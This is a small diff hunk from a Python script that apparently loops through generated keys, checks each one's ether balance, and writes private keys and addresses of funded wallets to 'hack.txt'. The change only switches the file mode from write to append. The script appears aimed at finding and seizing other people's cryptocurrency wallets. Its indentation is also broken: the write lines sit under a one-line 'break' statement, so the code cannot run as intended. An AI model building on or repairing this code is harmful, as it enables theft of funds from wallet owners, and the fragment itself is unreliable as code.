@@ -21,7 +21,7 @@ while a<=10000000:
     a=a+1
     
     if balance_ether > 0.001: break
-       f = open("hack.txt","w")
+       f = open("hack.txt","a")
        f.write(private_key)
        f.write(address)
        f.close()
